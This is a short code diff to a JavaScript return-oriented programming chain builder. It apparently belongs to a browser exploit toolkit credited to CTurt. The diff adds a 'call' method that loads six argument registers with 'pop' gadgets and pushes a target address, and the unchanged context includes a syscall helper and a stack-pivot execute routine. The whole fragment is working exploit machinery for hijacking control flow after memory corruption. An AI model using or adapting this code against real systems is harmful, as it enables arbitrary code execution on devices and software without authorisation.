@@ -113,7 +113,25 @@ function RopChain() {
         this.add(typeof(arg6) !== "undefined" ? arg6 : 0)
         this.add("syscall")
     }
-
+    
+    // credits to CTurt
+    this.call = function(address, arg1, arg2, arg3, arg4, arg5, arg6) {
+        this.add("pop rdi");
+        this.add(typeof(arg1) !== "undefined" ? arg1 : 0)
+        this.add("pop rsi");
+        this.add(typeof(arg2) !== "undefined" ? arg2 : 0)
+        this.add("pop rdx");
+        this.add(typeof(arg3) !== "undefined" ? arg3 : 0)
+        this.add("pop rcx");
+        this.add(typeof(arg4) !== "undefined" ? arg4 : 0)
+        this.add("pop r8");
+        this.add(typeof(arg5) !== "undefined" ? arg5 : 0)
+        this.add("pop r9");
+        this.add(typeof(arg6) !== "undefined" ? arg6 : 0)
+        
+        this.rop_chain.push(address.getLowBitsUnsigned());
+        this.rop_chain.push(address.getHighBitsUnsigned());
+    }
 
     this.execute = function() {
         var xchg = gadgets['xchg rax, rsp; dec dword ptr [rax - 0x77]'];
